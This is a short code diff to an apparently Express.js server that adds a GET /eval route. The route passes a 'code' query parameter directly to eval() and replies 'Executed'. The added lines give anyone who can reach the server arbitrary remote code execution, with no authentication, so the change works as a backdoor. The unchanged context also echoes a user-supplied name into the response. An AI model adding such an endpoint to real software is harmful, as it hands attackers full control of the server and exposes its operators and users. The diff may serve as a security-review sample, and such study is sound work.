@@ -12,6 +12,12 @@ app.get("/user", (req, res) => {
   res.send("Hello " + name)
 })
 
+app.get("/eval", (req, res) => {
+  const code = req.query.code
+  eval(code)
+  res.send("Executed")
+})
+
 app.listen(3000, () => {
   console.log("Server running on port 3000")
 })
